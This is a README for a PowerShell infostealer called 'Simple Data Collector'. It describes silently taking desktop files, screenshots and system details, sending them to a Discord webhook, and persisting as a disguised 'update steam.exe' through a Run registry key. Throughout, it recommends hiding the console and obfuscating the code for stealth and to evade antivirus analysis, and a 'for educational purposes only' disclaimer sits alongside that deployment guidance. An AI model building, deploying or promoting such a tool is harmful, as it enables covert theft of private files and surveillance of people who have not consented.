# Simple Data Collector

This PowerShell script is designed to silently collect specific types of files from a user's desktop and capture screenshots, sending them to a designated Discord webhook. It also establishes persistence by cloning itself and adding an entry to the system's autostart.

**It is strongly recommended to compile this script using tools like PS2EXE to create a standalone executable and to compile it without a visible console window for stealthier operation. Code obfuscation is also advised to hinder analysis.**

## Features

* **Silent Cloning:** Copies the script's executable to a hidden folder (`C:\UpdateSteam\`) with a deceptive name (`update steam.exe`).
* **Autostart Persistence:** Adds an entry to the `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` registry key to ensure the script runs on system startup.
* **Desktop File Exfiltration:** Scans the desktop for files with the following extensions: `.txt`, `.docx`, `.doc`, `.pdf`, `.png`, `.jpg`.
* **File Size Limit:** Only files smaller than 8MB are considered for exfiltration.
* **Periodic File Sending:** Attempts to send one eligible file from the desktop to the Discord webhook every 3 seconds.
* **Screenshot Capture:** Periodically captures a screenshot of the entire screen.
* **Screenshot Sending:** Sends captured screenshots to the Discord webhook.
* **System Information Gathering:** Collects and sends basic system information (username, computer name, OS, CPU, GPU, RAM, IP address, uptime, MAC address) to the Discord webhook upon execution.
* **Logging:** Maintains a detailed log of its activities in the `%TEMP%\script_log.txt` file.
* **`curl.exe` Preference:** Prioritizes using `curl.exe` (if available) for file and screenshot uploads. Includes an alternative method for screenshot uploads if `curl.exe` is not found.

## Prerequisites

* **PowerShell:** The script is written in PowerShell and requires a PowerShell environment to run.
* **Discord Webhook URL:** You need a valid Discord webhook URL where the collected data and screenshots will be sent. **Remember to replace the placeholder URL in the script with your actual webhook URL.**
* **`curl.exe` (Recommended):** While the script attempts an alternative method for sending screenshots if `curl.exe` is not found, having `curl.exe` available in the system's PATH or standard locations is recommended for reliable file uploads.
* **.NET Libraries (for Screenshots):** The script relies on `.NET` libraries (`System.Windows.Forms` and `System.Drawing`) for capturing screenshots. These are typically available on Windows systems.
* **PS2EXE (Recommended):** For creating a standalone executable.
* **Code Obfuscation Tool (Recommended):** To make the script harder to analyze.

## Setup

1.  **Obtain a Discord Webhook URL:** Create a webhook in your desired Discord server channel.
2.  **Modify the Script:** Open the `Simple Data Collector.ps1` file and replace the placeholder webhook URL on the first line:
    ```powershell
    $webhook = "YOUR_DISCORD_WEBHOOK_URL"
    ```
3.  **(Optional) Review Configuration:** Adjust other configuration variables at the beginning of the script (e.g., `$destinationFolder`, `$clonedExeName`, `$extensionsToScan`, `$maxFileSizeMB`, `$uploadIntervalSeconds`) according to your needs.
4.  **(Recommended) Compile with PS2EXE:** Use PS2EXE to convert the `.ps1` file into a standalone `.exe` without a console window.
5.  **(Recommended) Obfuscate the Code:** Use a PowerShell obfuscation tool to make the code more difficult to understand and analyze.

## Usage

This script is intended to run silently in the background without user interaction after initial execution (especially after compilation with PS2EXE).

## Important Considerations

* **Ethical Implications:** This script has the potential to be used for malicious purposes. Ensure you have explicit permission before running it on any system you do not own or have the authority to manage.
* **Antivirus Detection:** Due to its behavior (persistence, file access, network communication), this script may be flagged as potentially malicious by antivirus software. Compilation and obfuscation might help in evading detection but are not guaranteed.
* **Error Handling:** While the script includes error handling and logging, unexpected issues may still occur depending on the target environment.
* **Discord Rate Limiting:** Sending too many requests to the Discord webhook in a short period may result in rate limiting. The script has a delay, but be mindful of the frequency if you modify it.

## Disclaimer

**This script is provided for educational and informational purposes only. The author is not responsible for any misuse or damage caused by this script.** Use it responsibly and ethically.
